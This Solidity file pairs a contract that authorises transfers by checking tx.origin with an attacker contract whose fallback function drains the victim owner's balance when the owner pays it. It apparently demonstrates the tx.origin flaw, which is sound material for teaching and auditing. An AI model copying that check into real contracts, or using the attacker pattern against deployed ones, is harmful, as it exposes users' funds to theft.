pragma solidity >=0.4.22 <0.6.0;
contract TxOriginVictim {
address owner;
constructor () public {
  owner = msg.sender;
}
function transferTo(address to, uint amount) public {
  require(tx.origin == owner);
  to.call.value(amount)("");
}
function() payable public {}
}

contract TxOriginAttacker {
address owner;
constructor () public {
  owner = msg.sender;
}
function getOwner() public returns (address) {
  return owner;
}
function() payable public {
  TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
}
}
